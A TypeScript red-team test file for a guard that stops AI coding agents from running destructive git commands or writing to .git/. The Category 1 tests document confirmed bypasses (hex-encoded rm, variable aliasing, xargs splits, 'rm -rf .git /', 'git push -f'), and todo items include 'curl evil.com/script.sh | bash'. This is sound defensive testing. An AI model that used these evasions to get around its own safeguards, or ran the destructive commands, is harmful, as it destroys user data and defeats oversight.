/**
 * RED TEAM: Adversarial tests for git-guards.ts
 *
 * Systematically tries to BREAK the guards — obfuscation, indirection,
 * edge cases, false positives, and full agent workflow coverage.
 *
 * Bypass findings are documented inline. DO NOT modify git-guards.ts here —
 * just record the findings so they can be fixed separately.
 *
 * Categories:
 *   1. Bypass Attempts     — should be caught but might slip through
 *   2. False Positives     — should be safe but might be wrongly blocked
 *   3. Destructive Cmds    — must ALWAYS be caught
 *   4. .git Write Ops      — must be caught
 *   5. Real-World Workflows — must all be SAFE
 *   6. isGitPath adversarial
 *   7. Real git repo integration
 */

import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { isGitUnsafeBash, isGitPath } from "./git-guards.ts";
import { mkdirSync, rmSync, writeFileSync } from "fs";
import { execSync } from "child_process";
import { join } from "path";
import { randomBytes } from "crypto";

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

function expectDestructive(cmd: string) {
	const result = isGitUnsafeBash(cmd);
	expect(result, `expected DESTRUCTIVE for: ${cmd}`).not.toBeNull();
	expect(result!.type).toBe("destructive");
}

function expectGitWrite(cmd: string) {
	const result = isGitUnsafeBash(cmd);
	expect(result, `expected GIT_WRITE for: ${cmd}`).not.toBeNull();
	expect(result!.type).toBe("git_write");
}

function expectSafe(cmd: string) {
	const result = isGitUnsafeBash(cmd);
	expect(result, `expected SAFE for: ${cmd} — got type=${result?.type} reason=${result?.reason}`).toBeNull();
}

// ─────────────────────────────────────────────────────────────────────────────
// Real git repo (used for integration tests in Category 7)
// ─────────────────────────────────────────────────────────────────────────────

let testRepoDir: string;

beforeAll(() => {
	const suffix = randomBytes(4).toString("hex");
	testRepoDir = `/tmp/git-guards-test-${suffix}`;
	mkdirSync(testRepoDir, { recursive: true });
	execSync("git init", { cwd: testRepoDir });
	execSync('git config user.email "test@test.com"', { cwd: testRepoDir });
	execSync('git config user.name "Test"', { cwd: testRepoDir });
	writeFileSync(join(testRepoDir, "README.md"), "# Test\n");
	execSync("git add -A && git commit -m 'initial'", { cwd: testRepoDir, shell: "/bin/bash" });
});

afterAll(() => {
	if (testRepoDir) {
		rmSync(testRepoDir, { recursive: true, force: true });
	}
});

// ═════════════════════════════════════════════════════════════════════════════
// CATEGORY 1: Bypass Attempts
// Things that SHOULD be caught but might slip through.
// Tests that document a confirmed bypass use the pattern:
//   expect(isGitUnsafeBash(cmd)).toBeNull(); // BYPASS: <reason>
// These tests PASS (recording current behavior). When the guard is fixed
// they will fail, signaling the test needs updating.
// ═════════════════════════════════════════════════════════════════════════════

describe("Category 1 — Bypass Attempts", () => {
	// ──────────────────────────────────────────────────────────────────────────
	// Shell obfuscation
	// ──────────────────────────────────────────────────────────────────────────
	describe("Shell obfuscation", () => {
		test("BYPASS: $'\\x72\\x6d' (hex-encoded rm) — shell decodes but guard doesn't", () => {
			// $'\x72\x6d' is `rm` in ANSI-C quoting. The guard does lexical matching, so
			// it never sees "rm" — the hex form slips through.
			expect(isGitUnsafeBash("$'\\x72\\x6d' -rf .git/")).toBeNull(); // BYPASS
		});

		test("BYPASS: r\\x6d -rf .git/ (C-style hex escape in bare token) slips through", () => {
			expect(isGitUnsafeBash("r\\x6d -rf .git/")).toBeNull(); // BYPASS
		});

		test("CAUGHT: $(echo rm) -rf .git/ — rm appears literally inside $()", () => {
			// Even though rm is inside $(), the guard still sees 'rm' as a word boundary match.
			expectGitWrite("$(echo rm) -rf .git/");
		});

		test("CAUGHT: `echo rm` -rf .git/ — rm appears literally inside backticks", () => {
			expectGitWrite("`echo rm` -rf .git/");
		});

		test("CAUGHT: eval 'rm -rf .git/' — rm appears literally inside string", () => {
			expectGitWrite("eval 'rm -rf .git/'");
		});

		test("CAUGHT: bash <<< 'rm -rf .git/' — rm appears in here-string", () => {
			expectGitWrite("bash <<< 'rm -rf .git/'");
		});
	});

	// ──────────────────────────────────────────────────────────────────────────
	// Variable indirection
	// ──────────────────────────────────────────────────────────────────────────
	describe("Variable indirection", () => {
		test("BYPASS: CMD=rm; $CMD -rf .git/ — guard checks =git, not =rm", () => {
			// After splitting on ';': segment2 is '$CMD -rf .git/'.
			// WRITE_COMMANDS_RE doesn't match '$CMD' (no literal rm/mv/etc).
			expect(isGitUnsafeBash("CMD=rm; $CMD -rf .git/")).toBeNull(); // BYPASS
		});

		test("BYPASS: alias r=rm; r -rf .git/ — aliased short name", () => {
			// Segment2 'r -rf .git/' has .git/ but WRITE_COMMANDS_RE doesn't match 'r'
			expect(isGitUnsafeBash("alias r=rm; r -rf .git/")).toBeNull(); // BYPASS
		});

		test("BYPASS: X=.git; rm -rf $X/config — guard checks '=git' (literal), not '=.git'", () => {
			// The variable construction check: /=git\b/.test(normalized)
			// matches 'TARGET=git' (var = string 'git'), but NOT 'X=.git' (var = '.git').
			// The dot in '.git' means the string assigned is '.git', and '=.git' does not
			// match /=git\b/ since there's a '.' before 'git'.
			expect(isGitUnsafeBash("X=.git; rm -rf $X/config")).toBeNull(); // BYPASS
		});

		test("BYPASS: GITDIR='.git'; rm -rf $GITDIR — longer var name skips =git detection", () => {
			// =git must appear as whole token — 'GITDIR=' doesn't match /=git\b/
			// Hmm actually /=git\b/ matches '=git' but 'GITDIR='.git'' has the assignment
			// After normalization: "GITDIR='.git'; rm -rf $GITDIR"
			// Does /=git\b/ match? No — the assignment is GITDIR='.git' where after = comes '
			// Actually: normalized = "GITDIR='.git'; rm -rf $GITDIR"
			// /=git\b/ looks for =git word boundary — '.git' has ' before it so no match
			expect(isGitUnsafeBash("GITDIR='.git'; rm -rf $GITDIR")).toBeNull(); // BYPASS
		});
	});

	// ──────────────────────────────────────────────────────────────────────────
	// xargs and find -exec (cross-segment path/command split)
	// ──────────────────────────────────────────────────────────────────────────
	describe("xargs and find -exec", () => {
		test("BYPASS: echo .git | xargs rm -rf — path in seg1, rm in seg2", () => {
			// Pipe splits: seg1='echo .git' (no write cmd), seg2='xargs rm -rf' (no .git/)
			// The guard checks each segment independently, so neither triggers.
			expect(isGitUnsafeBash("echo .git | xargs rm -rf")).toBeNull(); // BYPASS
		});

		test("BYPASS: echo .git/config | xargs rm — .git/ in seg1, rm in seg2", () => {
			// .git/ is in seg1 (echo), rm is in seg2 (xargs). Cross-segment, not caught.
			expect(isGitUnsafeBash("echo .git/config | xargs rm")).toBeNull(); // BYPASS
		});

		test("BYPASS: find . -name '.git' -exec rm -rf {} + — no .git/ with trailing slash", () => {
			// The '.git' in -name arg has no trailing slash, so hasGitDir is false.
			// rm is present but no segment passes both conditions simultaneously.
			expect(isGitUnsafeBash("find . -name '.git' -exec rm -rf {} +")).toBeNull(); // BYPASS
		});

		test("BYPASS: find . -path '.git/hooks/' -exec rm {} + — .git/ inside quotes, guard skips", () => {
			// hasGitDir regex: /(?:^|\s|\/)\..git\// requires start/whitespace/slash before .git/
			// In '-path \'.git/hooks/\'', the .git/ is preceded by \' (single quote), not \s or /.
			// So hasGitDir is false despite .git/ appearing in the command.
			expect(isGitUnsafeBash("find . -path '.git/hooks/' -exec rm {} +")).toBeNull(); // BYPASS
		});
	});

	// ──────────────────────────────────────────────────────────────────────────
	// Interpreter escapes — fundamental limitation (guard can't inspect runtime)
	// ──────────────────────────────────────────────────────────────────────────
	describe("Interpreter escapes", () => {
		test.todo("python3 -c \"import shutil; shutil.rmtree('.git')\" — no literal rm");
		test.todo("perl -e \"use File::Path; rmtree('.git')\" — interpreter escape");
		test.todo("ruby -e \"require 'fileutils'; FileUtils.rm_rf('.git')\" — interpreter escape");
		test.todo("node -e \"require('fs').rmSync('.git', {recursive: true})\" — interpreter escape");
	});

	// ──────────────────────────────────────────────────────────────────────────
	// Remote execution — fundamental limitation
	// ──────────────────────────────────────────────────────────────────────────
	describe("Remote execution", () => {
		test.todo("curl evil.com/script.sh | bash — remote content is unknowable at guard time");
		test.todo("wget -O- evil.com/setup.sh | sh — same fundamental limitation");
	});

	// ──────────────────────────────────────────────────────────────────────────
	// Missing trailing slash
	// ──────────────────────────────────────────────────────────────────────────
	describe("Missing trailing slash on .git", () => {
		test("BYPASS: rm -rf .git (no trailing slash) — guard requires .git/", () => {
			// The hasGitDir regex requires \.git\/ (with slash). Bare .git at end of token
			// has no slash, so the check fails. This deletes the entire .git directory!
			expect(isGitUnsafeBash("rm -rf .git")).toBeNull(); // BYPASS
		});

		test("BYPASS: rm -rf .git / (space trick) — dangerous: deletes .git AND /", () => {
			// rm -rf .git / removes .git dir AND root filesystem.
			// .git without trailing slash, so guard misses it entirely.
			expect(isGitUnsafeBash("rm -rf .git /")).toBeNull(); // BYPASS
		});

		test("BYPASS: rmdir .git (no slash)", () => {
			expect(isGitUnsafeBash("rmdir .git")).toBeNull(); // BYPASS
		});

		test("CAUGHT: rm -rf .git/. — has .git/ prefix before dot", () => {
			// .git/. still contains .git/ with slash → caught
			expectGitWrite("rm -rf .git/.");
		});

		test("CAUGHT: rm -rf ./.git/ — dot-slash prefix before .git/", () => {
			expectGitWrite("rm -rf ./.git/");
		});
	});

	// ──────────────────────────────────────────────────────────────────────────
	// Path traversal
	// ──────────────────────────────────────────────────────────────────────────
	describe("Path traversal", () => {
		test("CAUGHT: rm -rf ../../.git/ — / before .git/ matches", () => {
			expectGitWrite("rm -rf ../../.git/");
		});

		test("CAUGHT: rm /abs/path/.git/config — absolute path with .git/", () => {
			expectGitWrite("rm /abs/path/.git/config");
		});

		test("CAUGHT: rm /Users/someone/project/.git/config", () => {
			expectGitWrite("rm /Users/someone/project/.git/config");
		});
	});

	// ──────────────────────────────────────────────────────────────────────────
	// Newline injection
	// ──────────────────────────────────────────────────────────────────────────
	describe("Newline injection (collapsed by normalization)", () => {
		test("CAUGHT: newline-injected git reset --hard (normalizes to space)", () => {
			// normalize collapses \n to space: 'git log git reset --hard' — pattern still matches
			expectDestructive("git log\ngit reset --hard");
		});

		test("CAUGHT: newline before rm -rf .git/ (normalizes to space)", () => {
			expectGitWrite("ls\nrm -rf .git/");
		});

		test("CAUGHT: git reset --hard with tab whitespace", () => {
			expectDestructive("git\treset\t--hard");
		});
	});

	// ──────────────────────────────────────────────────────────────────────────
	// git push -f shorthand
	// ──────────────────────────────────────────────────────────────────────────
	describe("git push -f shorthand", () => {
		test("BYPASS: git push -f — guard only matches --force, not the -f alias", () => {
			// The DESTRUCTIVE_GIT_COMMANDS regex uses --force, not -f
			expect(isGitUnsafeBash("git push -f")).toBeNull(); // BYPASS
		});

		test("BYPASS: git push -f origin main — shorthand slips through", () => {
			expect(isGitUnsafeBash("git push -f origin main")).toBeNull(); // BYPASS
		});

		test("CAUGHT: git push --force", () => {
			expectDestructive("git push --force");
		});

		test("CAUGHT: git push --force origin", () => {
			expectDestructive("git push --force origin");
		});
	});

	// ──────────────────────────────────────────────────────────────────────────
	// Unicode homoglyphs — fundamental limitation
	// ──────────────────────────────────────────────────────────────────────────
	describe("Unicode homoglyphs", () => {
		test.todo("Unicode full-width dot (U+FF0E) in .git/ path — guard uses literal ASCII dot");
		test.todo("Unicode full-width slash (U+FF0F) in .git/ path");
		test.todo("Zero-width chars injected between r and m in 'rm'");
	});

	// ──────────────────────────────────────────────────────────────────────────
	// Git plumbing (writes .git internals via git subcommands, not write cmds)
	// ──────────────────────────────────────────────────────────────────────────
	describe("Git plumbing commands", () => {
		test("BYPASS (debatable): git update-ref refs/heads/main abc123 — writes .git/refs", () => {
			// update-ref modifies .git/refs/heads/main but is a legit git operation.
			// Whether to block this is a policy question, but currently passes through.
			expect(isGitUnsafeBash("git update-ref refs/heads/main abc123")).toBeNull();
		});

		test("BYPASS (debatable): git symbolic-ref HEAD refs/heads/main — writes .git/HEAD", () => {
			// symbolic-ref modifies .git/HEAD but is a legit plumbing op.
			expect(isGitUnsafeBash("git symbolic-ref HEAD refs/heads/main")).toBeNull();
		});

		test("SAFE: git update-index --add src/file.ts — staging, not .git internals write", () => {
			expectSafe("git update-index --add src/file.ts");
		});
	});
});

// ═════════════════════════════════════════════════════════════════════════════
// CATEGORY 2: False Positives (should be SAFE but might be wrongly blocked)
// ═════════════════════════════════════════════════════════════════════════════

describe("Category 2 — False Positives (must be SAFE)", () => {
	describe("git URLs ending in .git", () => {
		test("git clone https://github.com/user/repo.git", () => {
			expectSafe("git clone https://github.com/user/repo.git");
		});

		test("git clone into .git-suffixed dir", () => {
			expectSafe("git clone https://github.com/user/repo.git my-repo");
		});

		test("git remote add origin with .git URL", () => {
			expectSafe("git remote add origin https://github.com/org/project.git");
		});

		test("git fetch https://github.com/user/fork.git main", () => {
			expectSafe("git fetch https://github.com/user/fork.git main");
		});

		test("git push origin HEAD:refs/for/main (Gerrit) with .git suffix in remote", () => {
			expectSafe("git push https://gerrit.example.com/repo.git HEAD:refs/for/main");
		});
	});

	describe("read-only .git access (never blocked)", () => {
		test("cat .git/HEAD", () => expectSafe("cat .git/HEAD"));
		test("cat .git/config", () => expectSafe("cat .git/config"));
		test("ls -la .git/hooks/", () => expectSafe("ls -la .git/hooks/"));
		test("stat .git/config", () => expectSafe("stat .git/config"));
		test("file .git/objects/pack/*.idx", () => expectSafe("file .git/objects/pack/*.idx"));
		test("grep -r pattern .git/config", () => expectSafe("grep -r pattern .git/config"));
		test("rg 'pattern' .git/config", () => expectSafe("rg 'pattern' .git/config"));
		test("head -1 .git/HEAD", () => expectSafe("head -1 .git/HEAD"));
		test("wc -l .git/config", () => expectSafe("wc -l .git/config"));
		test("find .git -name 'config' (read-only find)", () => expectSafe("find .git -name 'config'"));
		test("git diff .git/config (reads, does not write)", () => expectSafe("git diff .git/config"));
		test("diff .git/config /tmp/backup", () => expectSafe("diff .git/config /tmp/backup"));
		test("xxd .git/index | head -20", () => expectSafe("xxd .git/index | head -20"));
	});

	describe(".gitignore, .github, .gitmodules, .gitattributes (must not be confused with .git/)", () => {
		test("cat .gitignore", () => expectSafe("cat .gitignore"));
		test("echo '*.log' >> .gitignore (append to .gitignore)", () => {
			// .gitignore ≠ .git/ — the guard requires trailing slash
			expectSafe("echo '*.log' >> .gitignore");
		});
		test("ls .github/workflows/", () => expectSafe("ls .github/workflows/"));
		test("cp .github/workflows/ci.yml /tmp/ci.yml", () => {
			expectSafe("cp .github/workflows/ci.yml /tmp/ci.yml");
		});
		test("cat .gitmodules", () => expectSafe("cat .gitmodules"));
		test("chmod +x .github/scripts/deploy.sh", () => {
			expectSafe("chmod +x .github/scripts/deploy.sh");
		});
		test("touch .gitattributes", () => expectSafe("touch .gitattributes"));
		test("rm .gitkeep", () => expectSafe("rm .gitkeep"));
		test("rm -rf .github/old-workflow.yml", () => expectSafe("rm -rf .github/old-workflow.yml"));
		test("mv .gitmodules .gitmodules.bak", () => expectSafe("mv .gitmodules .gitmodules.bak"));
	});

	describe("search commands that mention .git in non-write context", () => {
		test("rg with --glob '!.git/'", () => expectSafe("rg 'pattern' --glob '!.git/'"));
		test("find with -not -path '.git/*'", () => expectSafe("find . -not -path '.git/*' -name '*.ts'"));
		test("echo mentioning .git/ in text", () => expectSafe("echo 'the .git/ folder structure'"));
		test("printf with .git/ in format string", () => expectSafe("printf 'check .git/config\\n'"));
		test("rg excluding .git/ dir", () => expectSafe("rg --type ts 'TODO' --glob '!.git/'"));
	});

	describe("git operations that are legitimately safe", () => {
		test("git log complex format", () => expectSafe("git log --format='%H %s' --all"));
		test("git show HEAD:src/file.ts", () => expectSafe("git show HEAD:src/file.ts"));
		test("git diff --cached --stat", () => expectSafe("git diff --cached --stat"));
		test("git stash list", () => expectSafe("git stash list"));
		test("git stash push -m message", () => expectSafe("git stash push -m 'work in progress'"));
		test("git worktree add with -b", () => expectSafe("git worktree add .worktrees/feature -b feature"));
		test("git worktree list", () => expectSafe("git worktree list"));
		test("git submodule update --init --recursive", () => {
			expectSafe("git submodule update --init --recursive");
		});
		test("git submodule status", () => expectSafe("git submodule status"));
		test("git branch -D old-branch", () => expectSafe("git branch -D old-branch"));
		test("git tag v1.0.0", () => expectSafe("git tag v1.0.0"));
		test("git cherry-pick abc123", () => expectSafe("git cherry-pick abc123"));
		test("git revert HEAD", () => expectSafe("git revert HEAD"));
		test("git merge --no-ff feature-branch", () => expectSafe("git merge --no-ff feature-branch"));
		test("git am < patch.mbox (input redirect only)", () => expectSafe("git am < patch.mbox"));
		test("git rebase --abort", () => expectSafe("git rebase --abort"));
		test("git rebase --continue", () => expectSafe("git rebase --continue"));
		test("git bisect start", () => expectSafe("git bisect start"));
		test("git notes add -m 'note'", () => expectSafe("git notes add -m 'note'"));
		test("git push --force-with-lease", () => expectSafe("git push --force-with-lease"));
		test("git push --force-with-lease=HEAD", () => expectSafe("git push --force-with-lease=HEAD"));
		test("git push --force-with-lease origin main", () => {
			expectSafe("git push --force-with-lease origin main");
		});
		test("git clean -n (dry run)", () => expectSafe("git clean -n"));
		test("git clean --dry-run", () => expectSafe("git clean --dry-run"));
		test("git clean -nd (dry run + dirs)", () => expectSafe("git clean -nd"));
		test("git reset --soft HEAD~1", () => expectSafe("git reset --soft HEAD~1"));
		test("git reset HEAD file.ts (unstage)", () => expectSafe("git reset HEAD file.ts"));
	});

	describe("build / tool commands with incidental .git-like paths", () => {
		test("cargo build with .git-helper path", () => {
			expectSafe("cargo build --manifest-path /home/user/.git-helper/Cargo.toml");
		});
		test("npm script in .git-hooks-setup package", () => {
			expectSafe("npm run lint --prefix .git-hooks-setup");
		});
		test("cp .gitkeep to temp", () => expectSafe("cp .gitkeep /tmp/.gitkeep"));
		test("tee to non-.git file", () => expectSafe("git log | tee /tmp/output.txt"));
	});

	describe("POTENTIAL FALSE POSITIVE: cp/mv FROM .git (read intent, conservative block)", () => {
		test("cp .git/config /tmp/backup — flagged (conservative: cp on .git/)", () => {
			// The guard flags ANY use of a write command with .git/ present, even when
			// .git/ is only the SOURCE. This is intentionally conservative.
			// FP NOTE: copying from .git doesn't modify the repo state, but the guard
			// can't distinguish source from destination in `cp src dest`.
			const result = isGitUnsafeBash("cp .git/config /tmp/backup");
			expect(result).not.toBeNull();
			expect(result!.type).toBe("git_write");
			// Documenting: this is a conservative false positive. The guard blocks it
			// because distinguishing cp-from vs cp-to requires argument position analysis.
		});
	});
});

// ═════════════════════════════════════════════════════════════════════════════
// CATEGORY 3: Destructive Commands (must ALWAYS be caught)
// ═════════════════════════════════════════════════════════════════════════════

describe("Category 3 — Destructive Commands (must always be caught)", () => {
	describe("git reset --hard", () => {
		test("git reset --hard", () => expectDestructive("git reset --hard"));
		test("git reset --hard HEAD", () => expectDestructive("git reset --hard HEAD"));
		test("git reset --hard HEAD~1", () => expectDestructive("git reset --hard HEAD~1"));
		test("git reset --hard HEAD~10", () => expectDestructive("git reset --hard HEAD~10"));
		test("git reset --hard abc123def456", () => expectDestructive("git reset --hard abc123def456"));
		test("git reset --hard origin/main", () => expectDestructive("git reset --hard origin/main"));
		test("git reset --hard ORIG_HEAD", () => expectDestructive("git reset --hard ORIG_HEAD"));
		test("git reset --hard FETCH_HEAD", () => expectDestructive("git reset --hard FETCH_HEAD"));
		test("extra whitespace: git  reset  --hard", () => expectDestructive("git  reset  --hard"));
	});

	describe("git checkout -- (discard changes)", () => {
		test("git checkout -- .", () => expectDestructive("git checkout -- ."));
		test("git checkout -- *", () => expectDestructive("git checkout -- *"));
		test("git checkout -- src/file.ts", () => expectDestructive("git checkout -- src/file.ts"));
		test("git checkout -- '*.ts'", () => expectDestructive("git checkout -- '*.ts'"));
		test("git checkout . (bare dot)", () => expectDestructive("git checkout ."));
		test("git checkout .  (trailing spaces)", () => expectDestructive("git checkout .  "));
	});

	describe("git clean", () => {
		test("git clean -f", () => expectDestructive("git clean -f"));
		test("git clean -fd", () => expectDestructive("git clean -fd"));
		test("git clean -xfd", () => expectDestructive("git clean -xfd"));
		test("git clean -ffx (double force)", () => expectDestructive("git clean -ffx"));
		test("git clean -fx .", () => expectDestructive("git clean -fx ."));
		test("git clean -df (reordered flags)", () => expectDestructive("git clean -df"));
	});

	describe("git push --force", () => {
		test("git push --force", () => expectDestructive("git push --force"));
		test("git push origin main --force", () => expectDestructive("git push origin main --force"));
		test("git push --force origin", () => expectDestructive("git push --force origin"));
		test("git push --force origin main", () => expectDestructive("git push --force origin main"));
	});

	describe("git init", () => {
		test("git init", () => expectDestructive("git init"));
		test("cd /repo && git init", () => expectDestructive("cd /repo && git init"));
		test("git init .", () => expectDestructive("git init ."));
		test("git init new-project", () => expectDestructive("git init new-project"));
	});

	describe("destructive ops hidden in compound commands", () => {
		test("echo hello && git reset --hard && echo done", () => {
			expectDestructive("echo hello && git reset --hard && echo done");
		});

		test("git fetch && git reset --hard origin/main", () => {
			expectDestructive("git fetch && git reset --hard origin/main");
		});

		test("git status; git clean -fd; git status", () => {
			expectDestructive("git status; git clean -fd; git status");
		});

		test("git log | git reset --hard (pipe doesn't protect)", () => {
			expectDestructive("git log | git reset --hard");
		});

		test("many safe ops then one destructive at end", () => {
			expectDestructive(
				"git fetch origin && git log --oneline -5 && git diff && git status && git reset --hard origin/main"
			);
		});

		test("destructive op sandwiched between safe ops", () => {
			expectDestructive("git status && git checkout -- . && git log");
		});
	});
});

// ═════════════════════════════════════════════════════════════════════════════
// CATEGORY 4: .git Write Operations (must be caught)
// ═════════════════════════════════════════════════════════════════════════════

describe("Category 4 — .git Write Operations (must be caught)", () => {
	describe("rm targeting .git", () => {
		test("rm -rf .git/", () => expectGitWrite("rm -rf .git/"));
		test("rm .git/config", () => expectGitWrite("rm .git/config"));
		test("rm -f .git/index", () => expectGitWrite("rm -f .git/index"));
		test("rm .git/hooks/*", () => expectGitWrite("rm .git/hooks/*"));
		test("rm -rf /Users/someone/project/.git/config", () => {
			expectGitWrite("rm -rf /Users/someone/project/.git/config");
		});
		test("rm -rf ../../.git/hooks/pre-commit", () => {
			expectGitWrite("rm -rf ../../.git/hooks/pre-commit");
		});
		test("rmdir .git/custom-dir/", () => expectGitWrite("rmdir .git/custom-dir/"));
	});

	describe("mv targeting .git", () => {
		test("mv .git/config .git/config.bak", () => expectGitWrite("mv .git/config .git/config.bak"));
		test("mv .git/hooks/pre-commit /tmp/", () => expectGitWrite("mv .git/hooks/pre-commit /tmp/"));
		test("mv /tmp/hook .git/hooks/pre-commit", () => expectGitWrite("mv /tmp/hook .git/hooks/pre-commit"));
	});

	describe("cp to .git (as destination)", () => {
		test("cp myhook .git/hooks/pre-commit", () => expectGitWrite("cp myhook .git/hooks/pre-commit"));
		test("cp -r hooks/ .git/hooks/", () => expectGitWrite("cp -r hooks/ .git/hooks/"));
	});

	describe("chmod / chown targeting .git", () => {
		test("chmod +x .git/hooks/pre-commit", () => expectGitWrite("chmod +x .git/hooks/pre-commit"));
		test("chmod 755 .git/hooks/pre-commit", () => expectGitWrite("chmod 755 .git/hooks/pre-commit"));
		test("chown user:group .git/config", () => expectGitWrite("chown user:group .git/config"));
		test("chown -R root .git/", () => expectGitWrite("chown -R root .git/"));
	});

	describe("touch / mkdir targeting .git", () => {
		test("touch .git/info/exclude", () => expectGitWrite("touch .git/info/exclude"));
		test("mkdir .git/refs/tags/v2", () => expectGitWrite("mkdir .git/refs/tags/v2"));
		test("mkdir -p .git/custom/dir", () => expectGitWrite("mkdir -p .git/custom/dir"));
	});

	describe("tee / dd / truncate / shred targeting .git", () => {
		test("echo config | tee .git/config", () => expectGitWrite("echo config | tee .git/config"));
		test("BYPASS: dd if=/dev/zero of=.git/config — of= prefix means .git/ preceded by '=', not \\s", () => {
			// hasGitDir: /(?:^|\s|\/)\..git\// needs start/whitespace/slash before .git/
			// 'of=.git/config' has '=' before .git/, which doesn't match. No shell '>' redirect either.
			// dd is in WRITE_COMMANDS_RE but hasGitDir never fires. BYPASS.
			expect(isGitUnsafeBash("dd if=/dev/zero of=.git/config")).toBeNull(); // BYPASS
		});
		test("truncate --size 0 .git/index", () => expectGitWrite("truncate --size 0 .git/index"));
		test("shred .git/config", () => expectGitWrite("shred .git/config"));
		test("shred -u .git/objects/pack/*.pack", () => expectGitWrite("shred -u .git/objects/pack/*.pack"));
	});

	describe("shell redirect targeting .git", () => {
		test("echo stuff > .git/config", () => expectGitWrite("echo stuff > .git/config"));
		test("cat file > .git/hooks/pre-push", () => expectGitWrite("cat file > .git/hooks/pre-push"));
		test("printf 'x' >> .git/config", () => expectGitWrite("printf 'x' >> .git/config"));
		test("cat /dev/null > /path/to/repo/.git/config (absolute)", () => {
			expectGitWrite("cat /dev/null > /path/to/repo/.git/config");
		});
	});

	describe("ln (symlink) targeting .git", () => {
		test("ln -s /tmp/hook .git/hooks/pre-commit", () => {
			expectGitWrite("ln -s /tmp/hook .git/hooks/pre-commit");
		});
		test("ln evil .git/hooks/pre-push", () => expectGitWrite("ln evil .git/hooks/pre-push"));
	});

	describe("install targeting .git", () => {
		test("install -m 755 script.sh .git/hooks/post-commit", () => {
			expectGitWrite("install -m 755 script.sh .git/hooks/post-commit");
		});
	});

	describe("glob patterns targeting .git", () => {
		test("rm .git/hooks/*", () => expectGitWrite("rm .git/hooks/*"));
		test("chmod +x .git/hooks/*", () => expectGitWrite("chmod +x .git/hooks/*"));
		test("rm .git/refs/heads/*", () => expectGitWrite("rm .git/refs/heads/*"));
	});
});

// ═════════════════════════════════════════════════════════════════════════════
// CATEGORY 5: Real-World Agent Workflows (must ALL be SAFE)
// ═════════════════════════════════════════════════════════════════════════════

describe("Category 5 — Real-World Agent Workflows (must all be SAFE)", () => {
	test("cargo fmt && git add && git diff pipeline", () => {
		expectSafe("cargo fmt --all && git add -A && git diff --cached --stat");
	});

	test("git add specific files && git commit", () => {
		expectSafe("git add src/file.ts packages/foo/bar.ts && git commit -m 'fix: thing'");
	});

	test("git stash && git pull --rebase && git stash pop", () => {
		expectSafe("git stash && git pull --rebase && git stash pop");
	});

	test("git fetch origin && git rebase origin/main", () => {
		expectSafe("git fetch origin && git rebase origin/main");
	});

	test("git worktree add && cd && git status", () => {
		expectSafe("git worktree add .worktrees/feature -b feature && cd .worktrees/feature && git status");
	});

	test("git log --oneline -10 | head -5", () => {
		expectSafe("git log --oneline -10 | head -5");
	});

	test("git branch -D old-branch", () => {
		expectSafe("git branch -D old-branch");
	});

	test("git tag v1.0.0 && git push origin v1.0.0", () => {
		expectSafe("git tag v1.0.0 && git push origin v1.0.0");
	});

	test("git cherry-pick abc123", () => {
		expectSafe("git cherry-pick abc123");
	});

	test("git revert HEAD", () => {
		expectSafe("git revert HEAD");
	});

	test("git merge --no-ff feature-branch", () => {
		expectSafe("git merge --no-ff feature-branch");
	});

	test("git am < patch.mbox (input redirect)", () => {
		expectSafe("git am < patch.mbox");
	});

	test("complex pipe: git log | head | xargs git show", () => {
		expectSafe("git log --format='%H' | head -1 | xargs git show");
	});

	test("pnpm install && git add lockfile && git commit", () => {
		expectSafe("pnpm install && git add pnpm-lock.yaml && git commit -m 'chore: update lockfile'");
	});

	test("git diff --name-only | xargs prettier --write", () => {
		expectSafe("git diff --name-only | xargs prettier --write");
	});

	test("git log pretty-format | while read hash", () => {
		expectSafe("git log --pretty=format:'%H' -20 | while read hash; do git show $hash --stat; done");
	});

	test("git stash && git checkout main && git stash pop", () => {
		expectSafe("git stash && git checkout main && git stash pop");
	});

	test("git fetch && git log origin/main..HEAD (compare)", () => {
		expectSafe("git fetch origin && git log origin/main..HEAD --oneline");
	});

	test("multi-step: format, lint, add, commit", () => {
		expectSafe("bun run fmt && bun run lint && git add -A && git commit -m 'style: format'");
	});
});

// ═════════════════════════════════════════════════════════════════════════════
// CATEGORY 6: isGitPath adversarial
// ═════════════════════════════════════════════════════════════════════════════

describe("Category 6 — isGitPath adversarial", () => {
	describe("Must return TRUE (path is inside .git/)", () => {
		test(".git/config", () => expect(isGitPath(".git/config")).toBe(true));
		test(".git/HEAD", () => expect(isGitPath(".git/HEAD")).toBe(true));
		test("repo/.git/hooks/pre-commit", () => expect(isGitPath("repo/.git/hooks/pre-commit")).toBe(true));
		test("../../.git/config", () => expect(isGitPath("../../.git/config")).toBe(true));
		test("/home/user/project/.git/config", () => expect(isGitPath("/home/user/project/.git/config")).toBe(true));
		test("Windows-style .git\\config", () => expect(isGitPath(".git\\config")).toBe(true));
		test("mixed slashes /repo/.git\\config", () => expect(isGitPath("/repo/.git\\config")).toBe(true));
		test("bare .git (the dir itself)", () => expect(isGitPath(".git")).toBe(true));
		test("path ending in .git (no trailing slash)", () => expect(isGitPath("project/.git")).toBe(true));
		test("submodule/.git (file ref in submodule)", () => expect(isGitPath("submodule/.git")).toBe(true));
		test("deep nested: a/b/c/.git/objects/pack", () => {
			expect(isGitPath("a/b/c/.git/objects/pack")).toBe(true);
		});
	});

	describe("Must return FALSE (not inside .git/)", () => {
		test(".gitignore", () => expect(isGitPath(".gitignore")).toBe(false));
		test(".github/workflows/ci.yml", () => expect(isGitPath(".github/workflows/ci.yml")).toBe(false));
		test(".gitmodules", () => expect(isGitPath(".gitmodules")).toBe(false));
		test(".gitattributes", () => expect(isGitPath(".gitattributes")).toBe(false));
		test("src/git-utils.ts", () => expect(isGitPath("src/git-utils.ts")).toBe(false));
		test("my-git-helper/config", () => expect(isGitPath("my-git-helper/config")).toBe(false));
		test(".git-temp/config (not exactly .git segment)", () => expect(isGitPath(".git-temp/config")).toBe(false));
		test("git/config (no leading dot)", () => expect(isGitPath("git/config")).toBe(false));
		test(".gitkeep", () => expect(isGitPath(".gitkeep")).toBe(false));
		test(".github (just the dir)", () => expect(isGitPath(".github")).toBe(false));
		test("mygit/config (starts with mygit)", () => expect(isGitPath("mygit/config")).toBe(false));
	});

	describe("Edge cases", () => {
		test("empty string", () => expect(isGitPath("")).toBe(false));
		test("just a dot '.'", () => expect(isGitPath(".")).toBe(false));
		test("path with only slashes '///'", () => expect(isGitPath("///")).toBe(false));
	});
});

// ═════════════════════════════════════════════════════════════════════════════
